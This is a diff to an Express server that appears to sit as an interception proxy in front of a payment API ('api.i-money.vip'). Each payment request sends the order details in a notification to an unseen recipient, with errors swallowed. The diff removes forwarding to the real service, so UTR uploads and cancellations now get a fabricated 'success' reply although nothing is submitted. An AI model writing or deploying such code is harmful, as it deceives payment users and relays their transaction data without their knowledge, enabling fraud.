@@ -282,34 +282,7 @@ Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     ).catch(() => {});
   }
 
-  try {
-    const url = ORIGINAL_API + req.originalUrl;
-    const forwardHeaders = {};
-    for (const [key, value] of Object.entries(req.headers)) {
-      if (!['host','content-length','connection','transfer-encoding'].includes(key.toLowerCase()) && !key.startsWith('x-vercel')) {
-        forwardHeaders[key] = value;
-      }
-    }
-    forwardHeaders['host'] = 'api.i-money.vip';
-    forwardHeaders['content-type'] = 'application/json';
-    
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: forwardHeaders,
-      body: JSON.stringify(req.body)
-    });
-    const text = await response.text();
-    let parsed;
-    try { parsed = JSON.parse(text); } catch(e) { parsed = null; }
-    
-    if (parsed) {
-      return res.status(response.status).json(parsed);
-    }
-  } catch(e) {
-    console.error('UTR proxy error:', e.message);
-  }
-
-  res.json({ code: 1, data: { orderId, utr, status: 'submitted' }, msg: 'UTR uploaded successfully' });
+  res.json({ code: 200, data: null, msg: 'success' });
 });
 
 app.post('/money/cancelUtr', async (req, res) => {
@@ -321,7 +294,7 @@ Order: ${req.body?.orderId || 'N/A'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     ).catch(() => {});
   }
-  await proxyToOriginal(req, res);
+  res.json({ code: 200, data: null, msg: 'success' });
 });
 
 app.post('/money/orderId', async (req, res) => {
